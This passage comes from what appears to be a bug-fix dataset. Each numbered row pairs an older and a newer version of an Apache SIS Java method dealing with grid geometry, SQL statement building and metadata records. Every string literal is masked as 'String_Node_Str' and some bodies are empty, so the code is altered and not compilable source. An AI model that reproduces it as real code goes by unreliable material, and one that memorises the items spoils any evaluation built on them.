  boolean pixelIsPoint=CellGeometry.POINT.equals(cellGeometry);
  try {
    final MathTransform gridToCRS;
    if (affine != null) {
      gridToCRS=MathTransforms.linear(affine);
    }
 else {
      gridToCRS=Localization.nonLinear(modelTiePoints);
      pixelIsPoint=true;
    }
    gridGeometry=new GridGeometry(extent,pixelIsPoint ? PixelInCell.CELL_CENTER : PixelInCell.CELL_CORNER,gridToCRS,crs);
  }
 catch (  TransformException e) {
    gridGeometry=new GridGeometry(extent,crs);
    reader.owner.warning(null,e);
  }
  keyDirectory=null;
  numericParameters=null;
  asciiParameters=null;
  modelTiePoints=null;
  affine=null;
  return gridGeometry;
}","/** 
 * Creates the grid geometry and collect related metadata. This method shall be invoked exactly once after   {@link #validateMandatoryTags()}. After this method call (if successful),   {@link #gridGeometry} is guaranteed non-nulland can be used as a flag for determining that the build has been completed.
 * @param extent  the image width and height in pixels. Must be two-dimensional.
 * @return {@link #gridGeometry}, guaranteed non-null.
 * @throws FactoryException if an error occurred while creating a CRS or a transform.
 */
public GridGeometry build(final GridExtent extent) throws FactoryException {
  CoordinateReferenceSystem crs=null;
  if (keyDirectory != null) {
    final CRSBuilder helper=new CRSBuilder(reader);
    try {
      crs=helper.build(keyDirectory,numericParameters,asciiParameters);
      description=helper.description;
      cellGeometry=helper.cellGeometry;
    }
 catch (    NoSuchIdentifierException|ParameterNotFoundException e) {
      short key=Resources.Keys.UnsupportedProjectionMethod_1;
      if (e instanceof NoSuchAuthorityCodeException) {
        key=Resources.Keys.UnknownCRS_1;
      }
      reader.owner.warning(reader.resources().getString(key,reader.owner.getDisplayName()),e);
    }
catch (    IllegalArgumentException|NoSuchElementException|ClassCastException e) {
      if (!helper.alreadyReported) {
        canNotCreate(e);
      }
    }
  }
  boolean pixelIsPoint=CellGeometry.POINT.equals(cellGeometry);
  try {
    final MathTransform gridToCRS;
    if (affine != null) {
      gridToCRS=MathTransforms.linear(affine);
    }
 else {
      gridToCRS=Localization.nonLinear(modelTiePoints);
      pixelIsPoint=true;
    }
    gridGeometry=new GridGeometry(extent,pixelIsPoint ? PixelInCell.CELL_CENTER : PixelInCell.CELL_CORNER,gridToCRS,crs);
  }
 catch (  TransformException e) {
    gridGeometry=new GridGeometry(extent,crs);
    canNotCreate(e);
  }
  keyDirectory=null;
  numericParameters=null;
  asciiParameters=null;
  modelTiePoints=null;
  affine=null;
  return gridGeometry;
}"
91645,"/** 
 * Returns the grid geometry for this image.
 */
@Override public GridGeometry getGridGeometry() throws DataStoreContentException {
  if (referencing != null) {
    GridGeometry gridGeometry=referencing.gridGeometry;
    if (gridGeometry == null)     try {
      gridGeometry=referencing.build(extent());
    }
 catch (    FactoryException e) {
      throw new DataStoreContentException(reader.resources().getString(Resources.Keys.CanNotComputeGridGeometry_1,filename(),e));
    }
    return gridGeometry;
  }
 else {
    return new GridGeometry(extent(),null);
  }
}","/** 
 * Returns the grid geometry for this image.
 */
@Override public GridGeometry getGridGeometry() throws DataStoreContentException {
  if (referencing != null) {
    GridGeometry gridGeometry=referencing.gridGeometry;
    if (gridGeometry == null)     try {
      gridGeometry=referencing.build(extent());
    }
 catch (    FactoryException e) {
      throw new DataStoreContentException(reader.resources().getString(Resources.Keys.CanNotComputeGridGeometry_1,filename()),e);
    }
    return gridGeometry;
  }
 else {
    return new GridGeometry(extent(),null);
  }
}"
91646,"/** 
 * Returns a SQL statement for creating a foreigner key constraint. The returned statement is of the form:  {@preformat sqlALTER TABLE ""schema"".""table"" ADD CONSTRAINT ""table_column_fkey"" FOREIGN KEY(""column"") REFERENCES ""schema"".""target"" (primaryKey) ON UPDATE CASCADE ON DELETE RESTRICT}Note that the primary key is <strong>not</strong> quoted on intent. If quoted are desired, then they must be added explicitly before to call this method.
 * @param schema      the schema for both tables.
 * @param table       the table to alter with the new constraint.
 * @param column      the column to alter with the new constraint.
 * @param target      the table to reference.
 * @param primaryKey  the primary key in the target table.
 * @param cascade     {@code true} if updates in primary key should be cascaded.this apply to updates only; delete is always restricted.
 * @return a SQL statement for creating the foreigner key constraint.
 */
public final String createForeignKey(final String schema,final String table,final String column,final String target,final String primaryKey,boolean cascade){
  if (dialect == Dialect.DERBY) {
    cascade=false;
  }
  buffer.setLength(0);
  final String name=buffer.append(table).append('_').append(column).append(""String_Node_Str"").toString();
  return clear().append(""String_Node_Str"").appendIdentifier(schema,table).append(""String_Node_Str"").appendIdentifier(name).append(""String_Node_Str"").appendIdentifier(column).append(""String_Node_Str"").appendIdentifier(schema,target).append(""String_Node_Str"").append(primaryKey).append(""String_Node_Str"").append(cascade ? ""String_Node_Str"" : ""String_Node_Str"").append(""String_Node_Str"").toString();
}","/** 
 * Returns a SQL statement for creating a foreigner key constraint. The returned statement is of the form:  {@preformat sqlALTER TABLE ""schema"".""table"" ADD CONSTRAINT ""table_column_fkey"" FOREIGN KEY(""column"") REFERENCES ""schema"".""target"" (primaryKey) ON UPDATE CASCADE ON DELETE RESTRICT}Note that the primary key is <strong>not</strong> quoted on intent. If quoted are desired, then they must be added explicitly before to call this method.
 * @param schema      the schema for both tables.
 * @param table       the table to alter with the new constraint.
 * @param column      the column to alter with the new constraint.
 * @param target      the table to reference.
 * @param primaryKey  the primary key in the target table.
 * @param cascade     {@code true} if updates in primary key should be cascaded.this apply to updates only; delete is always restricted.
 * @return a SQL statement for creating the foreigner key constraint.
 */
public final String createForeignKey(final String schema,final String table,final String column,final String target,final String primaryKey,boolean cascade){
  if (dialect == Dialect.DERBY) {
    cascade=false;
  }
  buffer.setLength(0);
  final String name=buffer.append(table).append('_').append(column).append(""String_Node_Str"").toString();
  return clear().append(""String_Node_Str"").appendIdentifier(schema,table).append(""String_Node_Str"").appendIdentifier(name).append(""String_Node_Str"").appendIdentifier(column).append(""String_Node_Str"").appendIdentifier(schema,target).append(""String_Node_Str"").appendIdentifier(primaryKey).append(""String_Node_Str"").append(cascade ? ""String_Node_Str"" : ""String_Node_Str"").append(""String_Node_Str"").toString();
}"
91647,"/** 
 * Appends a value in a   {@code SELECT} statement.The  {@code ""=""} string will be inserted before the value.
 * @param value  the value to append, or {@code null}.
 * @return this builder, for method call chaining.
 */
public final SQLBuilder appendCondition(final Object value){
  if (value == null) {
    buffer.append(""String_Node_Str"");
    return this;
  }
  buffer.append('=');
  return appendValue(value);
}","/** 
 * Appends a value in a   {@code SELECT} statement.The  {@code ""=""} string will be inserted before the value.
 * @param value  the value to append, or {@code null}.
 * @return this builder, for method call chaining.
 * @throws FactoryException if an error occurred while using the geodetic database.
 */
public final SQLBuilder appendCondition(final Object value) throws FactoryException {
  if (value == null) {
    buffer.append(""String_Node_Str"");
    return this;
  }
  buffer.append('=');
  return appendValue(value);
}"
91648,"/** 
 * Appends a value in an   {@code INSERT} statement.
 * @param value  the value to append, or {@code null}.
 * @return this builder, for method call chaining.
 */
public final SQLBuilder appendValue(final Object value){
  if (value == null) {
    buffer.append(""String_Node_Str"");
  }
 else   if (value instanceof Boolean) {
    buffer.append((Boolean)value ? ""String_Node_Str"" : ""String_Node_Str"");
  }
 else   if (value instanceof Number) {
    buffer.append(value);
  }
 else {
    buffer.append('\'').append(doubleQuotes(value)).append('\'');
  }
  return this;
}","/** 
 * Appends a value in an   {@code INSERT} statement.
 * @param value  the value to append, or {@code null}.
 * @return this builder, for method call chaining.
 * @throws FactoryException if an error occurred while using the geodetic database.
 */
public final SQLBuilder appendValue(Object value) throws FactoryException {
  if (value == null) {
    buffer.append(""String_Node_Str"");
  }
 else   if (value instanceof Boolean) {
    buffer.append((Boolean)value ? ""String_Node_Str"" : ""String_Node_Str"");
  }
 else   if (value instanceof Number) {
    buffer.append(value);
  }
 else {
    if (value instanceof IdentifiedObject) {
      value=ReferencingServices.getInstance().getPreferredIdentifier((IdentifiedObject)value);
    }
    buffer.append('\'').append(doubleQuotes(value)).append('\'');
  }
  return this;
}"
91649,"/** 
 * Returns a potentially deep copy of the given metadata object.
 * @param metadata   the metadata object to copy.
 * @param copier     contains a map of metadata objects already copied.
 * @return a copy of the given metadata object, or {@code metadata} itself if there isno known implementation class or that implementation has no setter method.
 * @throws Exception if an error occurred while creating the copy. This include anychecked checked exception that the no-argument constructor may throw.
 */
final Object copy(final Object metadata,final MetadataCopier copier) throws Exception {
  if (setters == null) {
    return metadata;
  }
  Object copy=copier.copies.get(metadata);
  if (copy == null) {
    copy=implementation.newInstance();
    copier.copies.put(metadata,copy);
    final Object[] arguments=new Object[1];
    for (int i=0; i < allCount; i++) {
      final Method setter=setters[i];
      if (setter != null && !setter.isAnnotationPresent(Deprecated.class)) {
        Object value=get(getters[i],metadata);
        if (value != null) {
          value=copier.copyAny(elementTypes[i],value);
          if (value != null) {
            arguments[0]=value;
            set(setter,copy,arguments);
          }
        }
      }
    }
  }
  return copy;
}","/** 
 * Returns a potentially deep copy of the given metadata object.
 * @param metadata   the metadata object to copy.
 * @param copier     contains a map of metadata objects already copied.
 * @return a copy of the given metadata object, or {@code metadata} itself if there isno known implementation class or that implementation has no setter method.
 * @throws Exception if an error occurred while creating the copy. This include anychecked checked exception that the no-argument constructor may throw.
 */
final Object copy(final Object metadata,final MetadataCopier copier) throws Exception {
  if (setters == null) {
    return metadata;
  }
  Object copy=copier.copies.get(metadata);
  if (copy == null) {
    copy=implementation.getConstructor().newInstance();
    copier.copies.put(metadata,copy);
    final Object[] arguments=new Object[1];
    for (int i=0; i < allCount; i++) {
      final Method setter=setters[i];
      if (setter != null && !setter.isAnnotationPresent(Deprecated.class)) {
        Object value=get(getters[i],metadata);
        if (value != null) {
          value=copier.copyAny(elementTypes[i],value);
          if (value != null) {
            arguments[0]=value;
            set(setter,copy,arguments);
          }
        }
      }
    }
  }
  return copy;
}"
91650,"/** 
 * Sets the unique identifier for this metadata record.
 * @param newValue  the new identifier, or {@code null} if none.
 * @since 0.5
 */
public void setMetadataIdentifier(final Identifier newValue){
  checkWritePermission();
  metadataIdentifier=newValue;
}","/** 
 * Sets the unique identifier for this metadata record.
 * @param newValue  the new identifier, or {@code null} if none.
 * @since 0.5
 */
public void setMetadataIdentifier(final Identifier newValue){
  checkWritePermission();
  identifiers=nonNullCollection(identifiers,Identifier.class);
  NonMarshalledAuthority.setMarshallable(identifiers,newValue);
}"
91651,"/** 
 * Constructs a new instance initialized with the values from the specified metadata object. This is a <cite>shallow</cite> copy constructor, since the other metadata contained in the given object are not recursively copied.
 * @param object  the metadata to copy values from, or {@code null} if none.
 * @see #castOrCopy(Metadata)
 */
public DefaultMetadata(final Metadata object){
  super(object);
  if (object != null) {
    metadataIdentifier=object.getMetadataIdentifier();
    parentMetadata=object.getParentMetadata();
    languages=copyCollection(object.getLanguages(),Locale.class);
    characterSets=copyCollection(object.getCharacterSets(),Charset.class);
    metadataScopes=copyCollection(object.getMetadataScopes(),MetadataScope.class);
    contacts=copyCollection(object.getContacts(),Responsibility.class);
    dateInfo=copyCollection(object.getDateInfo(),CitationDate.class);
    metadataStandards=copyCollection(object.getMetadataStandards(),Citation.class);
    metadataProfiles=copyCollection(object.getMetadataProfiles(),Citation.class);
    alternativeMetadataReferences=copyCollection(object.getAlternativeMetadataReferences(),Citation.class);
    metadataLinkages=copyCollection(object.getMetadataLinkages(),OnlineResource.class);
    spatialRepresentationInfo=copyCollection(object.getSpatialRepresentationInfo(),SpatialRepresentation.class);
    referenceSystemInfo=copyCollection(object.getReferenceSystemInfo(),ReferenceSystem.class);
    metadataExtensionInfo=copyCollection(object.getMetadataExtensionInfo(),MetadataExtensionInformation.class);
    identificationInfo=copyCollection(object.getIdentificationInfo(),Identification.class);
    contentInfo=copyCollection(object.getContentInfo(),ContentInformation.class);
    distributionInfo=copyCollection(object.getDistributionInfo(),Distribution.class);
    dataQualityInfo=copyCollection(object.getDataQualityInfo(),DataQuality.class);
    portrayalCatalogueInfo=copyCollection(object.getPortrayalCatalogueInfo(),PortrayalCatalogueReference.class);
    metadataConstraints=copyCollection(object.getMetadataConstraints(),Constraints.class);
    applicationSchemaInfo=copyCollection(object.getApplicationSchemaInfo(),ApplicationSchemaInformation.class);
    metadataMaintenance=object.getMetadataMaintenance();
    acquisitionInformation=copyCollection(object.getAcquisitionInformation(),AcquisitionInformation.class);
    resourceLineages=copyCollection(object.getResourceLineages(),Lineage.class);
  }
}","/** 
 * Constructs a new instance initialized with the values from the specified metadata object. This is a <cite>shallow</cite> copy constructor, since the other metadata contained in the given object are not recursively copied.
 * @param object  the metadata to copy values from, or {@code null} if none.
 * @see #castOrCopy(Metadata)
 */
public DefaultMetadata(final Metadata object){
  super(object);
  if (object != null) {
    identifiers=singleton(object.getMetadataIdentifier(),Identifier.class);
    parentMetadata=object.getParentMetadata();
    languages=copyCollection(object.getLanguages(),Locale.class);
    characterSets=copyCollection(object.getCharacterSets(),Charset.class);
    metadataScopes=copyCollection(object.getMetadataScopes(),MetadataScope.class);
    contacts=copyCollection(object.getContacts(),Responsibility.class);
    dateInfo=copyCollection(object.getDateInfo(),CitationDate.class);
    metadataStandards=copyCollection(object.getMetadataStandards(),Citation.class);
    metadataProfiles=copyCollection(object.getMetadataProfiles(),Citation.class);
    alternativeMetadataReferences=copyCollection(object.getAlternativeMetadataReferences(),Citation.class);
    metadataLinkages=copyCollection(object.getMetadataLinkages(),OnlineResource.class);
    spatialRepresentationInfo=copyCollection(object.getSpatialRepresentationInfo(),SpatialRepresentation.class);
    referenceSystemInfo=copyCollection(object.getReferenceSystemInfo(),ReferenceSystem.class);
    metadataExtensionInfo=copyCollection(object.getMetadataExtensionInfo(),MetadataExtensionInformation.class);
    identificationInfo=copyCollection(object.getIdentificationInfo(),Identification.class);
    contentInfo=copyCollection(object.getContentInfo(),ContentInformation.class);
    distributionInfo=copyCollection(object.getDistributionInfo(),Distribution.class);
    dataQualityInfo=copyCollection(object.getDataQualityInfo(),DataQuality.class);
    portrayalCatalogueInfo=copyCollection(object.getPortrayalCatalogueInfo(),PortrayalCatalogueReference.class);
    metadataConstraints=copyCollection(object.getMetadataConstraints(),Constraints.class);
    applicationSchemaInfo=copyCollection(object.getApplicationSchemaInfo(),ApplicationSchemaInformation.class);
    metadataMaintenance=object.getMetadataMaintenance();
    acquisitionInformation=copyCollection(object.getAcquisitionInformation(),AcquisitionInformation.class);
    resourceLineages=copyCollection(object.getResourceLineages(),Lineage.class);
  }
}"
91652,"/** 
 * Returns a unique identifier for this metadata record. <div class=""note""><b>Note:</b> OGC 07-045 (Catalog Service Specification  ISO metadata application profile) recommends usage of a UUID (Universal Unique Identifier) as specified by <a href=""http://www.ietf.org"">IETF</a> to ensure identifiers uniqueness.</div>
 * @return unique identifier for this metadata record, or {@code null}.
 * @since 0.5
 */
@Override @XmlElement(name=""String_Node_Str"") @XmlJavaTypeAdapter(MD_Identifier.Since2014.class) public Identifier getMetadataIdentifier(){
  return metadataIdentifier;
}","/** 
 * Returns a unique identifier for this metadata record. <div class=""note""><b>Note:</b> OGC 07-045 (Catalog Service Specification  ISO metadata application profile) recommends usage of a UUID (Universal Unique Identifier) as specified by <a href=""http://www.ietf.org"">IETF</a> to ensure identifiers uniqueness.</div>
 * @return unique identifier for this metadata record, or {@code null}.
 * @since 0.5
 */
@Override @XmlElement(name=""String_Node_Str"") @XmlJavaTypeAdapter(MD_Identifier.Since2014.class) public Identifier getMetadataIdentifier(){
  return NonMarshalledAuthority.getMarshallable(identifiers);
}"
91653,"/** 
 * Sets the unique identifier for this metadata file.
 * @param newValue  the new identifier, or {@code null} if none.
 * @deprecated As of ISO 19115:2014, replaced by {@link #setMetadataIdentifier(Identifier)}
 */
@Deprecated public void setFileIdentifier(final String newValue){
  DefaultIdentifier identifier=DefaultIdentifier.castOrCopy(metadataIdentifier);
  if (identifier == null) {
    if (newValue == null)     return;
    identifier=new DefaultIdentifier();
  }
  identifier.setCode(newValue);
  if (newValue == null && (identifier instanceof AbstractMetadata) && ((AbstractMetadata)identifier).isEmpty()) {
    identifier=null;
  }
  setMetadataIdentifier(identifier);
}","/** 
 * Sets the unique identifier for this metadata file.
 * @param newValue  the new identifier, or {@code null} if none.
 * @deprecated As of ISO 19115:2014, replaced by {@link #setMetadataIdentifier(Identifier)}
 */
@Deprecated public void setFileIdentifier(final String newValue){
  DefaultIdentifier identifier=DefaultIdentifier.castOrCopy(NonMarshalledAuthority.getMarshallable(identifiers));
  if (identifier == null) {
    if (newValue == null)     return;
    identifier=new DefaultIdentifier();
  }
  identifier.setCode(newValue);
  if (newValue == null && (identifier instanceof AbstractMetadata) && ((AbstractMetadata)identifier).isEmpty()) {
    identifier=null;
  }
  setMetadataIdentifier(identifier);
}"
91654,"/** 
 * Infers a valid Unicode identifier from the given citation, or returns   {@code null} if none.This method is useful for extracting a short designation of an authority (e.g.  {@code ""EPSG""}) for processing purpose. This method performs the following actions: <ul class=""verbose""> <li>First, performs the same work than   {@link #getIdentifier(Citation)} except that {@code '_'}is used instead of   {@link org.apache.sis.util.iso.DefaultNameSpace#DEFAULT_SEPARATOR ':'}as the separator between the codespace and the code.</li> <li>If the result of above method call is   {@code null} or is not a{@linkplain org.apache.sis.util.CharSequences#isUnicodeIdentifier valid Unicode identifier}, then return   {@code null}.</li> <li>Otherwise remove the   {@linkplain Character#isIdentifierIgnorable(int) ignorable characters}, if any, and returns the result.</li> </ul> <div class=""note""><b>Note:</b> examples of ignorable identifier characters are <cite>zero width space</cite> or <cite>word joiner</cite>. Those characters are illegal in XML identifiers, and should therfore be removed if the Unicode identifier may also be used as XML identifier.</div> If non-null, the result is suitable for use as a XML identifier except for a few uncommon characters. <div class=""note""><b>Note:</b> the following characters are invalid in XML identifiers. However since they are valid in Unicode identifiers, they could be included in the string returned by this method: <ul> <li>  {@code }</li> <li>  {@code } (feminine ordinal indicator)</li><li> {@code } (masculine ordinal indicator)</li><li> {@code }</li> </ul></div>
 * @param citation  the citation for which to get the Unicode identifier, or {@code null}.
 * @return a non-empty Unicode identifier for the given citation without leading or trailing whitespaces,or  {@code null} if the given citation is null or does not have any Unicode identifier or title.
 * @see org.apache.sis.metadata.iso.ImmutableIdentifier
 * @see org.apache.sis.referencing.IdentifiedObjects#getUnicodeIdentifier(IdentifiedObject)
 * @see org.apache.sis.util.CharSequences#isUnicodeIdentifier(CharSequence)
 * @since 0.6
 */
public static String getUnicodeIdentifier(final Citation citation){
  return org.apache.sis.internal.util.Citations.removeIgnorableCharacters(org.apache.sis.internal.util.Citations.getIdentifier(citation,true));
}","/** 
 * Infers a valid Unicode identifier from the given citation, or returns   {@code null} if none.This method is useful for extracting a short designation of an authority (e.g.  {@code ""EPSG""}) for processing purpose. This method performs the following actions: <ul class=""verbose""> <li>First, performs the same work than   {@link #getIdentifier(Citation)} except that {@code '_'}is used instead of   {@link org.apache.sis.util.iso.DefaultNameSpace#DEFAULT_SEPARATOR ':'}as the separator between the codespace and the code.</li> <li>If the result of above method call is   {@code null} or is not a{@linkplain org.apache.sis.util.CharSequences#isUnicodeIdentifier valid Unicode identifier}, then return   {@code null}.</li> <li>Otherwise remove the   {@linkplain Character#isIdentifierIgnorable(int) ignorable characters}, if any, and returns the result.</li> </ul> <div class=""note""><b>Note:</b> examples of ignorable identifier characters are <cite>zero width space</cite> or <cite>word joiner</cite>. Those characters are illegal in XML identifiers, and should therfore be removed if the Unicode identifier may also be used as XML identifier.</div> If non-null, the result is suitable for use as a XML identifier except for a few uncommon characters. <div class=""note""><b>Note:</b> the following characters are invalid in XML identifiers. However since they are valid in Unicode identifiers, they could be included in the string returned by this method: <ul> <li>  {@code }</li> <li>  {@code } (feminine ordinal indicator)</li><li> {@code } (masculine ordinal indicator)</li><li> {@code }</li> </ul></div>
 * @param citation  the citation for which to get the Unicode identifier, or {@code null}.
 * @return a non-empty Unicode identifier for the given citation without leading or trailing whitespaces,or  {@code null} if the given citation is null or does not have any Unicode identifier or title.
 * @see org.apache.sis.metadata.iso.ImmutableIdentifier
 * @see org.apache.sis.referencing.IdentifiedObjects#getSimpleNameOrIdentifier(IdentifiedObject)
 * @see org.apache.sis.util.CharSequences#isUnicodeIdentifier(CharSequence)
 * @since 0.6
 */
public static String getUnicodeIdentifier(final Citation citation){
  return org.apache.sis.internal.util.Citations.removeIgnorableCharacters(org.apache.sis.internal.util.Citations.getIdentifier(citation,true));
}"
91655,"/** 
 * Searches for the given metadata in the database. If such metadata is found, then its identifier (primary key) is returned. Otherwise this method returns   {@code null}.
 * @param table     the table where to search.
 * @param columns   the table columns as given by {@link #getExistingColumns(String)}, or   {@code null}.
 * @param metadata  a map view of the metadata to search for.
 * @param stmt      the statement to use for executing the query.
 * @param helper    an helper class for creating the SQL query.
 * @return the identifier of the given metadata, or {@code null} if none.
 * @throws SQLException if an error occurred while searching in the database.
 */
final String search(final String table,Set<String> columns,final Map<String,Object> metadata,final Statement stmt,final SQLBuilder helper) throws SQLException {
}","/** 
 * Searches for the given metadata in the database. If such metadata is found, then its identifier (primary key) is returned. Otherwise this method returns   {@code null}.
 * @param table     the table where to search.
 * @param columns   the table columns as given by {@link #getExistingColumns(String)}, or   {@code null}.
 * @param metadata  a map view of the metadata to search for.
 * @param stmt      the statement to use for executing the query.
 * @param helper    an helper class for creating the SQL query.
 * @return the identifier of the given metadata, or {@code null} if none.
 * @throws SQLException if an error occurred while searching in the database.
 */
final String search(final String table,Set<String> columns,final Map<String,Object> metadata,final Statement stmt,final SQLBuilder helper) throws SQLException, FactoryException {
}"
91656,"/** 
 * Invoked by   {@link MetadataProxy} for fetching an attribute value from a table.
 * @param info      the interface type (together with cached information).This is mapped to the table name in the database.
 * @param method    the method invoked. This is mapped to the column name in the database.
 * @param toSearch  contains the identifier and preferred index of the record to search.
 * @return the value of the requested attribute.
 * @throws SQLException if the SQL query failed.
 * @throws MetadataStoreException if a value was not found or can not be converted to the expected type.
 */
final Object readColumn(final LookupInfo info,final Method method,final Dispatcher toSearch) throws SQLException, MetadataStoreException {
  final Class<?> type=subType(info.getMetadataType(),toSearch.identifier);
  final Class<?> returnType=method.getReturnType();
  final boolean wantCollection=Collection.class.isAssignableFrom(returnType);
  final Class<?> elementType=wantCollection ? Classes.boundOfParameterizedProperty(method) : returnType;
  final boolean isMetadata=standard.isMetadata(elementType);
  final String tableName=getTableName(type);
  final String columnName=info.asNameMap(standard).get(method.getName());
  final boolean isArray;
  Object value;
synchronized (this) {
    if (!getExistingColumns(tableName).contains(columnName)) {
      value=null;
      isArray=false;
    }
 else {
      CachedStatement result=take(type,Byte.toUnsignedInt(toSearch.preferredIndex));
      if (result == null) {
        final SQLBuilder helper=helper();
        final String query=helper.clear().append(""String_Node_Str"").appendIdentifier(schema,tableName).append(""String_Node_Str"").append(ID_COLUMN).append(""String_Node_Str"").toString();
        result=new CachedStatement(type,connection().prepareStatement(query),listeners);
      }
      value=result.getValue(toSearch.identifier,columnName);
      isArray=(value instanceof java.sql.Array);
      if (isArray) {
        final java.sql.Array array=(java.sql.Array)value;
        value=array.getArray();
        array.free();
      }
      toSearch.preferredIndex=(byte)recycle(result,Byte.toUnsignedInt(toSearch.preferredIndex));
    }
  }
  if (isArray && (wantCollection || !elementType.isPrimitive())) {
    final Object[] values=new Object[Array.getLength(value)];
    for (int i=0; i < values.length; i++) {
      Object element=Array.get(value,i);
      if (element != null) {
        if (isMetadata) {
          element=lookup(elementType,element.toString());
        }
 else         try {
          element=info.convert(elementType,element);
        }
 catch (        UnconvertibleObjectException e) {
          throw new MetadataStoreException(Errors.format(Errors.Keys.IllegalPropertyValueClass_3,columnName + '[' + i+ ']',elementType,element.getClass()),e);
        }
      }
      values[i]=element;
    }
    value=values;
    if (wantCollection) {
      value=specialize(UnmodifiableArrayList.wrap(values),returnType,elementType);
    }
  }
  if (value != null) {
    if (isMetadata) {
      value=lookup(elementType,value.toString());
    }
 else     try {
      value=info.convert(elementType,value);
    }
 catch (    UnconvertibleObjectException e) {
      throw new MetadataStoreException(Errors.format(Errors.Keys.IllegalPropertyValueClass_3,columnName,elementType,value.getClass()),e);
    }
    if (wantCollection) {
      if (Set.class.isAssignableFrom(returnType)) {
        return Collections.singleton(value);
      }
 else {
        return Collections.singletonList(value);
      }
    }
  }
  return value;
}","/** 
 * Invoked by   {@link MetadataProxy} for fetching an attribute value from a table.
 * @param info      the interface type (together with cached information).This is mapped to the table name in the database.
 * @param method    the method invoked. This is mapped to the column name in the database.
 * @param toSearch  contains the identifier and preferred index of the record to search.
 * @return the value of the requested attribute.
 * @throws SQLException if the SQL query failed.
 * @throws MetadataStoreException if a value was not found or can not be converted to the expected type.
 */
final Object readColumn(final LookupInfo info,final Method method,final Dispatcher toSearch) throws SQLException, MetadataStoreException {
  final Class<?> type=TableHierarchy.subType(info.getMetadataType(),toSearch.identifier);
  final Class<?> returnType=method.getReturnType();
  final boolean wantCollection=Collection.class.isAssignableFrom(returnType);
  final Class<?> elementType=wantCollection ? Classes.boundOfParameterizedProperty(method) : returnType;
  final boolean isMetadata=standard.isMetadata(elementType);
  final String tableName=getTableName(type);
  final String columnName=info.asNameMap(standard).get(method.getName());
  final boolean isArray;
  Object value;
synchronized (this) {
    if (!getExistingColumns(tableName).contains(columnName)) {
      value=null;
      isArray=false;
    }
 else {
      CachedStatement result=take(type,Byte.toUnsignedInt(toSearch.preferredIndex));
      if (result == null) {
        final SQLBuilder helper=helper();
        final String query=helper.clear().append(""String_Node_Str"").appendIdentifier(schema,tableName).append(""String_Node_Str"").appendIdentifier(ID_COLUMN).append(""String_Node_Str"").toString();
        result=new CachedStatement(type,connection().prepareStatement(query),listeners);
      }
      value=result.getValue(toSearch.identifier,columnName);
      isArray=(value instanceof java.sql.Array);
      if (isArray) {
        final java.sql.Array array=(java.sql.Array)value;
        value=array.getArray();
        array.free();
      }
      toSearch.preferredIndex=(byte)recycle(result,Byte.toUnsignedInt(toSearch.preferredIndex));
    }
  }
  if (isArray && (wantCollection || !elementType.isPrimitive())) {
    final Object[] values=new Object[Array.getLength(value)];
    for (int i=0; i < values.length; i++) {
      Object element=Array.get(value,i);
      if (element != null) {
        if (isMetadata) {
          element=lookup(elementType,element.toString());
        }
 else         try {
          element=info.convert(elementType,element);
        }
 catch (        UnconvertibleObjectException e) {
          throw new MetadataStoreException(Errors.format(Errors.Keys.IllegalPropertyValueClass_3,columnName + '[' + i+ ']',elementType,element.getClass()),e);
        }
      }
      values[i]=element;
    }
    value=values;
    if (wantCollection) {
      value=specialize(UnmodifiableArrayList.wrap(values),returnType,elementType);
    }
  }
  if (value != null) {
    if (isMetadata) {
      value=lookup(elementType,value.toString());
    }
 else     try {
      value=info.convert(elementType,value);
    }
 catch (    UnconvertibleObjectException e) {
      throw new MetadataStoreException(Errors.format(Errors.Keys.IllegalPropertyValueClass_3,columnName,elementType,value.getClass()),e);
    }
    if (wantCollection) {
      if (Set.class.isAssignableFrom(returnType)) {
        return Collections.singleton(value);
      }
 else {
        return Collections.singletonList(value);
      }
    }
  }
  return value;
}"
91657,"/** 
 * Returns an implementation of the specified metadata interface filled with the data referenced by the specified identifier. Alternatively, this method can also return a   {@link CodeList} or{@link Enum} element.
 * @param < T >         the parameterized type of the {@code type} argument.
 * @param type        the interface to implement (e.g. {@link org.opengis.metadata.citation.Citation}), or the   {@link ControlledVocabulary} type ({@link CodeList} or some {@link Enum}).
 * @param identifier  the identifier of the record for the metadata entity to be created.This is usually the primary key of the record to search for.
 * @return an implementation of the required interface, or the code list element.
 * @throws MetadataStoreException if a SQL query failed.
 */
public <T>T lookup(final Class<T> type,final String identifier) throws MetadataStoreException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",type);
  ArgumentChecks.ensureNonEmpty(""String_Node_Str"",identifier);
  Object value;
  if (ControlledVocabulary.class.isAssignableFrom(type)) {
    value=getCodeList(type,identifier);
  }
 else {
    final CacheKey key=new CacheKey(type,identifier);
synchronized (pool) {
      value=pool.get(key);
      if (value == null && type.isInterface()) {
        value=Proxy.newProxyInstance(classloader,new Class<?>[]{type,MetadataProxy.class},new Dispatcher(identifier,this));
        pool.put(key,value);
      }
    }
    if (value == null) {
      Method method=null;
      final Class<?> subType=subType(type,identifier);
      final Dispatcher toSearch=new Dispatcher(identifier,this);
      try {
        value=subType.getConstructor().newInstance();
        final LookupInfo info=getLookupInfo(subType);
        final Map<String,Object> map=asValueMap(value);
        final Map<String,String> methods=standard.asNameMap(subType,NAME_POLICY,KeyNamePolicy.METHOD_NAME);
        for (        final Map.Entry<String,Object> entry : map.entrySet()) {
          method=subType.getMethod(methods.get(entry.getKey()));
          info.setMetadataType(subType);
          final Object p=readColumn(info,method,toSearch);
          if (p != null) {
            entry.setValue(p);
          }
        }
      }
 catch (      ReflectiveOperationException e) {
        throw new MetadataStoreException(Errors.format(Errors.Keys.UnsupportedImplementation_1,subType),e);
      }
catch (      SQLException e) {
        throw new MetadataStoreException(toSearch.error(method),e);
      }
    }
  }
  return type.cast(value);
}","/** 
 * Returns an implementation of the specified metadata interface filled with the data referenced by the specified identifier. Alternatively, this method can also return a   {@link CodeList} or{@link Enum} element.
 * @param < T >         the parameterized type of the {@code type} argument.
 * @param type        the interface to implement (e.g. {@link org.opengis.metadata.citation.Citation}), or the   {@link ControlledVocabulary} type ({@link CodeList} or some {@link Enum}).
 * @param identifier  the identifier of the record for the metadata entity to be created.This is usually the primary key of the record to search for.
 * @return an implementation of the required interface, or the code list element.
 * @throws MetadataStoreException if a SQL query failed.
 */
public <T>T lookup(final Class<T> type,final String identifier) throws MetadataStoreException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",type);
  ArgumentChecks.ensureNonEmpty(""String_Node_Str"",identifier);
  Object value;
  if (ControlledVocabulary.class.isAssignableFrom(type)) {
    value=getCodeList(type,identifier);
  }
 else {
    final CacheKey key=new CacheKey(type,identifier);
synchronized (pool) {
      value=pool.get(key);
      if (value == null && type.isInterface()) {
